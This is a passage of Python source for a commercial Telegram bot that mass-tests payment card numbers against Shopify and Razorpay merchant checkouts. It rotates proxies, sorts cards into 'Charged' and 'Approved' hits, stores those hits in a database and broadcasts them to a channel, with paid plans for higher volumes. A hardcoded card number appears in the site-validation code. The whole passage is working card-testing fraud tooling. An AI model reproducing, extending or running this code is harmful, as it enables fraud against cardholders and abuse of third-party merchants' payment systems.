                status = result.get("Status", "Declined")
                resp = result.get("Response", "")
                gw = result.get("Gateway", gate_name)
                checked += 1
                lcd = card
                lrd = resp[:30]
                if status == "Error":
                    errors += 1
                elif status == "Charged":
                    charged += 1
                    hits.append(f"{card} - CHARGED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, result.get('Price', '-')))
                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz))
                elif status == "Approved":
                    approved += 1
                    hits.append(f"{card} - APPROVED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, result.get('Price', '-')))
                    if send_approved:
                        asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz))
                else:
                    declined += 1
                await update_ui()
            except asyncio.CancelledError:
                return
            except:
                if not is_stopped():
                    errors += 1
                    checked += 1

    batch_size = workers * 2
    all_tasks = []
    proc = process_store.get(uid)
    for i in range(0, len(cards), batch_size):
        if is_stopped(): break
        batch_tasks = [asyncio.create_task(worker(c)) for c in cards[i:i+batch_size]]
        all_tasks.extend(batch_tasks)
        if isinstance(proc, dict):
            proc["tasks"] = all_tasks
        await asyncio.gather(*batch_tasks, return_exceptions=True)

    await asyncio.sleep(0.3)
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    stop_label = f" ({bs('Stopped')})" if is_stopped() else ""
    ft = f"""{PE} <b>{bs('Complete')}{stop_label}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Charged')}</b> ━ <code>{charged}</code>\n{PE} <b>{bs('Approved')}</b> ━ <code>{approved}</code>\n{PE} <b>{bs('Declined')}</b> ━ <code>{declined}</code>\n{PE} <b>{bs('Errors')}</b> ━ <code>{errors}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    fkb = [[pbtn(f"{bs('C')} ━ {charged}", "none"), pbtn(f"{bs('A')} ━ {approved}", "none")],
           [pbtn(f"{bs('T')} ━ {checked}/{total}", "none"), pbtn(f"{h}{bs('h')}{m}{bs('m')}{s}{bs('s')}", "none")]]
    for _ in range(3):
        try:
            await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]])
            break
        except:
            await asyncio.sleep(0.5)

    await send_final_file(uid, charged, approved, declined, errors, total, hits, uid)
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, sem_type)
    cleanup_user_sem(uid)

async def _send_mass_hit(card, result, status, uid, username, name, is_rz=False):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        gw = result.get('Gateway', 'RazorPay' if is_rz else 'Shopify')
        resp = result.get('Response', '')[:150]
        if is_rz:
            msg, eid = format_card_result_no_price(status, card, gw, resp, bi)
        else:
            msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'), result.get('site', '-'), bi, 0.0)
        try:
            await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        except:
            pass
        if status == "Charged":
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay" if is_rz else "Shopify"))
    except:
        pass

async def send_final_file(uid, charged, approved, declined, errors, total, hits=None, target_chat=None):
    hits = hits or []
    fn = f"razor_x_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    target = target_chat or uid
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"{'='*49}\nRAZOR X RESULTS\n{'='*49}\n\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n")
            if hits:
                await f.write(f"\n{'='*49}\nHITS\n{'='*49}\n\n")
                for h in hits:
                    await f.write(h + "\n")
        try:
            await styled_send(target, f"{PE} <b>{bs('Results')}</b> {PE}", emoji_ids=[CE["fire"], CE["fire"]], file=fn)
        except:
            pass
        try:
            os.remove(fn)
        except:
            pass
    except:
        pass

# ====================== COMMAND HANDLERS ======================

# ---------- /start ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        if is_paid_plan(plan):
            plan_emoji = "🛠️"
            for pi in PLANS.values():
                if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
            sl = f"{PE} <b>{bs('STATUS')}</b> ━ {plan_emoji} <b>{plan.upper()}</b> {PE} (<code>{limit}</code> {bs('Mass Limit')})"
            se = [CE["star"], CE["crown"]]
        else:
            sl = f"<b>{bs('STATUS')}</b> ━ 🆓 <b>{plan.upper()}</b> (<code>{FREE_SP_DAILY_LIMIT}/{bs('day')}</code> {bs('in group')})"
            se = []
        text = f"""{PE} <b><i>{bs('Shopify')}</i></b>
|   {PE} <code>/sp</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/msp</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('RazorPay')}</i></b>
|   {PE} <code>/rz</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/mrz</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('Sites')}</i></b>
|   {PE} <code>/addsite</code> ━ <b>{bs('Add Shopify site (validated)')}</b>
|   {PE} <code>/addsites</code> ━ <b>{bs('Add multiple Shopify sites (validated)')}</b>
|   {PE} <code>/sites</code> ━ <b>{bs('List Shopify sites')}</b>
|   {PE} <code>/delsite</code> ━ <b>{bs('Remove Shopify site')}</b>
|   {PE} <code>/clearsites</code> ━ <b>{bs('Clear all Shopify sites')}</b>

{PE} <b><i>{bs('Razorpay Sites')}</i></b>
|   {PE} <code>/addrzsite</code> ━ <b>{bs('Add Razorpay site (validated)')}</b>
|   {PE} <code>/addrzsites</code> ━ <b>{bs('Add multiple Razorpay sites (validated)')}</b>
|   {PE} <code>/rzsites</code> ━ <b>{bs('List Razorpay sites')}</b>
|   {PE} <code>/delrzsite</code> ━ <b>{bs('Remove Razorpay site')}</b>
|   {PE} <code>/clearzrsites</code> ━ <b>{bs('Clear all Razorpay sites')}</b>

{PE} <b><i>{bs('Proxy')}</i></b> ({bs('Private')})
|   {PE} <code>/addpxy</code> ━ <b>{bs('Add')}</b>
|   {PE} <code>/proxy</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/chkpxy</code> ━ <b>{bs('Test')}</b>
|   {PE} <code>/rmpxy</code> ━ <b>{bs('Remove')}</b>

{PE} <b><i>{bs('Account')}</i></b>
|   {PE} <code>/info</code> ━ <b>{bs('Profile')}</b>
|   {PE} <code>/plan</code> ━ <b>{bs('Plans')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{sl}"""
        kb = [[pbtn(bs("Plans"), data="show_plans"), pbtn(bs("Support"), url="https://t.me/dixit_nath")],
              [pbtn(bs("Channel"), url=JOIN_CHANNEL_LINK), pbtn(bs("Group"), url=JOIN_GROUP_LINK)]]
        ei = [CE["bolt"], CE["search"], CE["pin"], CE["fire"], CE["search"], CE["pin"], CE["brain"], CE["plus"], CE["cross"], CE["globe"], CE["link"], CE["shield"], CE["link"], CE["eyes"], CE["tick"], CE["trash"], CE["info"], CE["info"]] + se
        await styled_reply(event, text, buttons=kb, emoji_ids=ei)
    except Exception as e:
        log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")

# ---------- Force join callback ----------
@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"""{PE} <b>{bs('Welcome')}</b> {PE}
{PE} <code>/start</code> <b>{bs('for commands')}</b>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
    else:
        await event.answer(f"❌ {bs('Not joined')}!", alert=True)

# ---------- Plans callback ----------
@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id)
    await event.answer()
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    plans_text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, plans_text, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/dixit_nath")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])

# ---------- /plan ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    cp = await get_user_plan(event.sender_id)
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    plans_text += f"""\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>\n{PE} <i>{bs('Contact admin')}</i>"""
    await styled_reply(event, plans_text, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/dixit_nath")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])

# ---------- /info ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    await ensure_user(event.sender_id)
    plan = await get_user_plan(event.sender_id)
    shopify_sites = await get_user_shopify_sites(event.sender_id)
    razorpay_sites = await get_user_razorpay_sites(event.sender_id)
    pc = await get_proxy_count(event.sender_id)
    plan_emoji = "🆓"
    for pi in PLANS.values():
        if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT expiry FROM users WHERE user_id = ?", (event.sender_id,))
    row = cursor.fetchone()
    conn.close()
    expiry = row["expiry"] if row else None
    exp_str = expiry.split("T")[0] if expiry else bs("Never")
    status = bs("Active") if is_paid_plan(plan) else bs("Free")
    limit_text = f"<code>{get_cc_limit(plan, event.sender_id)}</code>" if is_paid_plan(plan) else f"<code>{FREE_SP_DAILY_LIMIT}/{bs('day')} ({bs('group')})</code>"
    used_today = get_free_sp_usage(event.sender_id)
    usage_line = ""
    if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID:
        usage_line = f"\n{PE} <b>{bs('Used Today')}:</b> <code>{used_today}/{FREE_SP_DAILY_LIMIT}</code>"
    await styled_reply(event, f"""{PE} <b>{bs('Profile')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('ID')}:</b> <code>{event.sender_id}</code>
{PE} <b>{bs('Status')}:</b> <code>{status}</code>
{PE} <b>{bs('Plan')}:</b> {plan_emoji} <b>{plan.upper()}</b>
{PE} <b>{bs('Expiry')}:</b> <code>{exp_str}</code>
{PE} <b>{bs('Limit')}:</b> {limit_text}{usage_line}
{PE} <b>{bs('Shopify Sites')}:</b> <code>{len(shopify_sites)}</code>
{PE} <b>{bs('Razorpay Sites')}:</b> <code>{len(razorpay_sites)}</code>
{PE} <b>{bs('Proxies')}:</b> <code>{pc}/{bs('100')}</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["globe"], CE["link"], CE["shield"]])

# ---------- Shopify site commands ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addsite\b'))
async def add_shopify_site(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        return await styled_reply(event, f"{PE} <code>/addsite shopify-site.com</code>", emoji_ids=[CE["info"]])
    site = normalize_site_url(args[1])
    status_msg = await styled_reply(event, f"{PE} 🔄 {bs('Validating site...')}", emoji_ids=[CE["fire"]])
    result = await test_shopify_site(site)
    if result['status'] == 'alive':
        if await add_shopify_site_db(event.sender_id, site):
            await styled_edit(status_msg, f"{PE} ✅ {bs('Site added and validated')}: {site}", emoji_ids=[CE["check"]])
        else:
            await styled_edit(status_msg, f"{PE} ❌ {bs('Failed to add site')}", emoji_ids=[CE["cross"]])
    else:
        await styled_edit(status_msg, f"{PE} ❌ {bs('Site validation failed')}: {result['response']}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addsites\b'))
async def add_shopify_sites_file(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    reply = await event.get_reply_message()
    if not reply or not reply.document:
        return await styled_reply(event, f"{PE} {bs('Reply to a .txt file with sites')}", emoji_ids=[CE["info"]])
    try:
        downloaded = await reply.download_media(bytes)
        if not downloaded:
            raise ValueError("Empty file")
        lines = downloaded.decode('utf-8', errors='ignore').splitlines()
        sites = [normalize_site_url(line.strip()) for line in lines if line.strip()]
    except Exception as e:
        return await styled_reply(event, f"{PE} ❌ {bs('Error reading file')}: {e}", emoji_ids=[CE["cross"]])
    status_msg = await styled_reply(event, f"{PE} 🔄 {bs('Validating')} {len(sites)} {bs('sites...')}", emoji_ids=[CE["fire"]])
    valid = []
    invalid = []
    test_card = "5154623245618097|03|2032|156"
    for i, site in enumerate(sites):
        result = await test_shopify_site(site)
        if result['status'] == 'alive':
            valid.append(site)
        else:
            invalid.append(site)
        if (i + 1) % 5 == 0 or i + 1 == len(sites):
            try:
                await styled_edit(status_msg, f"{PE} 🔄 {bs('Validating')}... {i+1}/{len(sites)} | ✅{len(valid)} ❌{len(invalid)}", emoji_ids=[CE["fire"]])
            except:
                pass
    added = 0
    for site in valid:
        if await add_shopify_site_db(event.sender_id, site):
            added += 1
    await styled_edit(status_msg, f"{PE} ✅ {bs('Added')} {added}/{len(sites)} {bs('sites')}\n{PE} ❌ {bs('Invalid')}: {len(invalid)}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_shopify_sites(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    sites = await get_user_shopify_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} {bs('No Shopify sites')}", emoji_ids=[CE["warn"]])
    text = f"{PE} <b>{bs('Shopify Sites')}</b> ({len(sites)})\n<b>━━━━━━━━━━━━━━━━━</b>\n" + "\n".join(f"• {s}" for s in sites[:50])
    await styled_reply(event, text, emoji_ids=[CE["link"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]delsite\b'))
async def del_shopify_site(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        return await styled_reply(event, f"{PE} <code>/delsite site.com</code>", emoji_ids=[CE["info"]])
    site = normalize_site_url(args[1])
    if await remove_shopify_site_db(event.sender_id, site):
        await styled_reply(event, f"{PE} ✅ {bs('Removed')}: {site}", emoji_ids=[CE["check"]])
    else:
        await styled_reply(event, f"{PE} ❌ {bs('Site not found')}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]clearsites\b'))
async def clear_shopify_sites(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    count = await clear_shopify_sites_db(event.sender_id)
    await styled_reply(event, f"{PE} ✅ {bs('Cleared')} {count} {bs('sites')}", emoji_ids=[CE["check"]])

# ---------- Razorpay site commands ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addrzsite\b'))
async def add_razorpay_site(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        return await styled_reply(event, f"{PE} <code>/addrzsite https://pages.razorpay.com/your-link</code>", emoji_ids=[CE["info"]])
    site = args[1].strip()
    status_msg = await styled_reply(event, f"{PE} 🔄 {bs('Validating site...')}", emoji_ids=[CE["fire"]])
    result = await test_razorpay_site(site)
    if result['status'] == 'alive':
        if await add_razorpay_site_db(event.sender_id, site):
            await styled_edit(status_msg, f"{PE} ✅ {bs('Site added and validated')}: {site}", emoji_ids=[CE["check"]])
        else:
            await styled_edit(status_msg, f"{PE} ❌ {bs('Failed to add site')}", emoji_ids=[CE["cross"]])
    else:
        await styled_edit(status_msg, f"{PE} ❌ {bs('Site validation failed')}: {result['response']}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addrzsites\b'))
async def add_razorpay_sites_file(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    reply = await event.get_reply_message()
    if not reply or not reply.document:
        return await styled_reply(event, f"{PE} {bs('Reply to a .txt file with Razorpay page URLs')}", emoji_ids=[CE["info"]])
    try:
        downloaded = await reply.download_media(bytes)
        if not downloaded:
            raise ValueError("Empty file")
        lines = downloaded.decode('utf-8', errors='ignore').splitlines()
        sites = [line.strip() for line in lines if line.strip()]
    except Exception as e:
        return await styled_reply(event, f"{PE} ❌ {bs('Error reading file')}: {e}", emoji_ids=[CE["cross"]])
    status_msg = await styled_reply(event, f"{PE} 🔄 {bs('Validating')} {len(sites)} {bs('sites...')}", emoji_ids=[CE["fire"]])
    valid = []
    invalid = []
    test_card = "5154623245618097|03|2032|156"
    for i, site in enumerate(sites):
        result = await test_razorpay_site(site)
        if result['status'] == 'alive':
            valid.append(site)
        else:
            invalid.append(site)
        if (i + 1) % 5 == 0 or i + 1 == len(sites):
            try:
                await styled_edit(status_msg, f"{PE} 🔄 {bs('Validating')}... {i+1}/{len(sites)} | ✅{len(valid)} ❌{len(invalid)}", emoji_ids=[CE["fire"]])
            except:
                pass
    added = 0
    for site in valid:
        if await add_razorpay_site_db(event.sender_id, site):
            added += 1
    await styled_edit(status_msg, f"{PE} ✅ {bs('Added')} {added}/{len(sites)} {bs('sites')}\n{PE} ❌ {bs('Invalid')}: {len(invalid)}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rzsites$'))
async def list_razorpay_sites(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    sites = await get_user_razorpay_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} {bs('No Razorpay sites')}", emoji_ids=[CE["warn"]])
    text = f"{PE} <b>{bs('Razorpay Sites')}</b> ({len(sites)})\n<b>━━━━━━━━━━━━━━━━━</b>\n" + "\n".join(f"• {s}" for s in sites[:50])
    await styled_reply(event, text, emoji_ids=[CE["link"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]delrzsite\b'))
async def del_razorpay_site(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        return await styled_reply(event, f"{PE} <code>/delrzsite https://pages.razorpay.com/your-link</code>", emoji_ids=[CE["info"]])
    site = args[1].strip()
    if await remove_razorpay_site_db(event.sender_id, site):
        await styled_reply(event, f"{PE} ✅ {bs('Removed')}: {site}", emoji_ids=[CE["check"]])
    else:
        await styled_reply(event, f"{PE} ❌ {bs('Site not found')}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]clearzrsites\b'))
async def clear_razorpay_sites(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    count = await clear_razorpay_sites_db(event.sender_id)
    await styled_reply(event, f"{PE} ✅ {bs('Cleared')} {count} {bs('sites')}", emoji_ids=[CE["check"]])

# ---------- Helper functions for checks ----------
async def _check_free_limits(event, uid, plan, is_group):
    if uid in ADMIN_ID: return True
    if not is_paid_plan(plan):
        if not is_group:
            await send_group_only_message(event)
            return False
        used = get_free_sp_usage(uid)
        if used >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event, f"{PE} <b>{bs('Daily Limit')}</b> {used}/{FREE_SP_DAILY_LIMIT}", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/dixit_nath")]], emoji_ids=[CE["stop"]])
            return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>{bs('Wait')} {cd}{bs('s')}</b>", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/dixit_nath")]])
            return False
    return True

def _get_card_from_event(event, reply_msg):
    card = None
    if reply_msg and reply_msg.text:
        cc = extract_cc(reply_msg.text)
        if cc: card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc: card = cc[0]
    return card

# ---------- /sp (Shopify Single) ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def single_cc_check_shopify(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
    except: username, name = f"user_{uid}", "User"
    if is_paid_plan(plan) or uid in ADMIN_ID:
        sites = await get_user_shopify_sites(uid); proxies = await get_all_user_proxies(uid)
    else:
        sites, proxies = [], []
        for aid in ADMIN_ID:
            sites = await get_user_shopify_sites(aid); proxies = await get_all_user_proxies(aid)
            if sites: break
        if not sites:
            try:
                sites = await get_global_sites()
            except: pass
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No Shopify sites!')} </b><code>/addsite</code>", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    rotator = SmartRotator()
    try:
        http_session = await get_user_http_session(uid, "sp")
        async with get_user_sem(uid, "sp"):
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result, _ = await check_shopify_with_retry(card, sites, uid, proxies, 3, rotator, http_session=http_session)
            bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), result.get('Gateway', ''), result.get('Price', '')))
        msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], bi, elapsed, extra_field=("Price", result.get('Price', '-')) if result.get('Price', '-') != '-' else None)
        try: await lm.delete()
        except: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "Shopify"))
    except Exception as e:
        try: await lm.delete()
        except: pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ---------- /rz (Razorpay Single) ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rz\b'))
async def single_cc_check_razorpay(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except:
        username, name = f"user_{uid}", "User"
    proxies = await get_all_user_proxies(uid)
    if is_paid_plan(plan) or uid in ADMIN_ID:
        sites = await get_user_razorpay_sites(uid)
    else:
        sites = []
        for aid in ADMIN_ID:
            sites = await get_user_razorpay_sites(aid)
            if sites: break
    if not sites:
        sites = [None]
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card:
        return await styled_reply(event, f"{PE} <code>/rz card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        set_free_sp_last_use(uid)
        increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    rotator = SmartRotator()
    try:
        http_session = await get_user_http_session(uid, "rz")
        async with get_user_sem(uid, "rz"):
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result = await check_razorpay_with_retry(card, sites, uid, proxies, 3, rotator, http_session=http_session)
            bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get("Status", "Declined")
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), 'RazorPay', '-'))
        msg, eid = format_rz_single_result(status, card, 'RazorPay', result.get('Response', '')[:150], bi, elapsed)
        try: await lm.delete()
        except: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay"))
    except Exception as e:
        try: await lm.delete()
        except: pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ---------- /msp (Shopify Mass) ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def mass_check_shopify(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at, plan = await get_user_access(event)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    cmd_text = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text:
        content = cmd_text
        from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm:
            return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            downloaded = await rm.download_media(bytes)
            if downloaded:
                content = downloaded.decode('utf-8', errors='ignore')
            else:
                content = ""
        elif rm.text:
            content = rm.text
    else:
